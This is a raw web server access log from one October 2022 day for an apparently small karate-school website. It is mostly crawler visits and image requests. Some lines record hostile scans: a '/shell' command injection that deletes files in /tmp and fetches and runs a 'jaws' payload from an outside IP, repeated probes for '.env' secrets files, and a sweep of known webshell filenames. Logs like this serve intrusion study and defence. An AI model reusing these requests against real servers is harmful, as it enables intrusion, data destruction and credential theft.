::ffff:45.61.185.198 - - [22/Oct/2022:00:05:43 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::ffff:157.55.39.21 - - [22/Oct/2022:08:32:39 +0000] "GET /images/instructors/dokeeffe.jpg HTTP/1.1" 200 42708 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.142.236.41 - - [22/Oct/2022:08:35:49 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
::ffff:185.142.236.41 - - [22/Oct/2022:08:35:54 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "-"
::ffff:185.142.236.41 - - [22/Oct/2022:08:35:55 +0000] "GET /sitemap.xml HTTP/1.1" 404 150 "-" "-"
::ffff:185.142.236.41 - - [22/Oct/2022:08:35:56 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 163 "-" "-"
::ffff:185.142.236.41 - - [22/Oct/2022:08:35:57 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
::ffff:40.77.167.71 - - [22/Oct/2022:08:41:12 +0000] "GET /images/schools/earhartkaratedo.jpg HTTP/1.1" 200 35835 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:103.113.69.236 - - [22/Oct/2022:08:47:36 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:103.113.69.236 - - [22/Oct/2022:08:47:49 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:37.139.53.82 - - [22/Oct/2022:08:56:28 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.3; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [22/Oct/2022:08:56:29 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.3; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [22/Oct/2022:08:56:30 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 6.3; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:207.46.13.234 - - [22/Oct/2022:09:12:33 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:207.46.13.122 - - [22/Oct/2022:09:12:43 +0000] "GET /images/instructors/anunley.jpg HTTP/1.1" 200 32690 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:205.185.122.184 - - [22/Oct/2022:09:15:42 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:205.185.122.184 - - [22/Oct/2022:09:15:42 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:142.93.140.247 - - [22/Oct/2022:09:16:36 +0000] "GET / HTTP/1.1" 200 58140 "-" "ScamadviserExternalHit/1.0"
::ffff:40.77.167.71 - - [22/Oct/2022:09:18:06 +0000] "GET /images/shuri-lineage.jpg HTTP/1.1" 200 120427 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:209.141.51.222 - - [22/Oct/2022:09:20:03 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:209.141.51.222 - - [22/Oct/2022:09:20:04 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:209.141.35.128 - - [22/Oct/2022:09:20:20 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:209.141.35.128 - - [22/Oct/2022:09:20:20 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:209.141.51.222 - - [22/Oct/2022:09:21:33 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:209.141.51.222 - - [22/Oct/2022:09:21:34 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:114.119.143.135 - - [22/Oct/2022:09:23:51 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:135.125.244.48 - - [22/Oct/2022:09:34:18 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Oct/2022:09:34:18 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.21 - - [22/Oct/2022:09:40:06 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:54.36.148.138 - - [22/Oct/2022:09:44:35 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.18 - - [22/Oct/2022:09:44:37 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:207.46.13.129 - - [22/Oct/2022:09:58:36 +0000] "GET /images/schools/nunleykaratedo.jpg HTTP/1.1" 200 77040 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:135.125.244.48 - - [22/Oct/2022:10:03:27 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Oct/2022:10:03:27 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:45.79.171.66 - - [22/Oct/2022:10:05:52 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:157.55.39.8 - - [22/Oct/2022:10:06:44 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.122 - - [22/Oct/2022:10:19:39 +0000] "GET /images/schools/marinkaratedo.jpeg HTTP/1.1" 200 104735 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:157.55.39.137 - - [22/Oct/2022:10:26:25 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:185.254.196.115 - - [22/Oct/2022:10:27:58 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [22/Oct/2022:10:27:59 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:174.138.8.236 - - [22/Oct/2022:10:31:30 +0000] "GET /ab2g HTTP/1.1" 404 143 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:174.138.8.236 - - [22/Oct/2022:10:31:30 +0000] "GET /ab2h HTTP/1.1" 404 143 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:174.138.8.236 - - [22/Oct/2022:10:31:38 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:37.139.53.82 - - [22/Oct/2022:10:47:37 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:37.139.53.82 - - [22/Oct/2022:10:47:38 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:37.139.53.82 - - [22/Oct/2022:10:47:38 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:207.46.13.122 - - [22/Oct/2022:10:53:13 +0000] "GET /images/schools/dcakaratedo.jpg HTTP/1.1" 200 458708 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:35.86.107.213 - - [22/Oct/2022:11:03:18 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.220.195.61 - - [22/Oct/2022:11:03:19 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.92.151.114 - - [22/Oct/2022:11:03:29 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.92.151.114 - - [22/Oct/2022:11:03:32 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.209.189.205 - - [22/Oct/2022:11:03:49 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.209.189.205 - - [22/Oct/2022:11:03:51 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:51.159.99.253 - - [22/Oct/2022:11:10:38 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
::ffff:51.159.99.253 - - [22/Oct/2022:11:10:39 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
::ffff:52.226.210.206 - - [22/Oct/2022:11:11:32 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "python-requests/2.27.1"
::ffff:52.226.210.206 - - [22/Oct/2022:11:11:41 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
::ffff:167.248.133.118 - - [22/Oct/2022:11:12:27 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:167.248.133.118 - - [22/Oct/2022:11:12:27 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.118 - - [22/Oct/2022:11:12:27 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.248.133.118 - - [22/Oct/2022:11:12:27 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.118 - - [22/Oct/2022:11:12:28 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:34.78.6.216 - - [22/Oct/2022:11:12:54 +0000] "GET / HTTP/1.1" 200 58140 "-" "python-requests/2.28.1"
::ffff:207.46.13.135 - - [22/Oct/2022:11:20:08 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:135.125.244.48 - - [22/Oct/2022:11:27:07 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Oct/2022:11:27:07 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.17 - - [22/Oct/2022:11:29:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [22/Oct/2022:11:29:16 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:20.219.3.204 - - [22/Oct/2022:11:33:37 +0000] "GET /Makhdamxshell.php HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:33:39 +0000] "GET /wp-admin/includes/class-wp-media-list-data.php HTTP/1.1" 404 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:33:41 +0000] "GET /wp-includes/wp-class.php HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:33:44 +0000] "GET /radio.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:33:45 +0000] "GET /fw.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:33:47 +0000] "GET /fx.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:33:49 +0000] "GET /ups.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:33:50 +0000] "GET /wikindex.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:33:54 +0000] "GET /1index.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:33:55 +0000] "GET /0.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:33:58 +0000] "GET /01.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:01 +0000] "GET /0byte HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:03 +0000] "GET /0byte.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:05 +0000] "GET /1.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:07 +0000] "GET /10.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:09 +0000] "GET /100.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:11 +0000] "GET /11index.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:14 +0000] "GET /13.php HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:17 +0000] "GET /1337.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:20 +0000] "GET /2.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:24 +0000] "GET /2index.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:26 +0000] "GET /3.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:28 +0000] "GET /4.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:30 +0000] "GET /403.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:31 +0000] "GET /404.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:34 +0000] "GET /5.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:37 +0000] "GET /9.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:39 +0000] "GET /Alfa.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:40 +0000] "GET /FoxWSO.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:44 +0000] "GET /WSO.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:46 +0000] "GET /a.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:46 +0000] "GET /about.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:50 +0000] "GET /alf.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:52 +0000] "GET /alfa.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:53 +0000] "GET /alfashell.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:55 +0000] "GET /alwso.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:56 +0000] "GET /autoload_classmap.php HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:58 +0000] "GET /b.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:34:59 +0000] "GET /blog.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:35:00 +0000] "GET /blog/fw.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:35:04 +0000] "GET /bypass.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:35:04 +0000] "GET /c.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
::ffff:20.219.3.204 - - [22/Oct/2022:11:35:07 +0000] "GET /c99.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
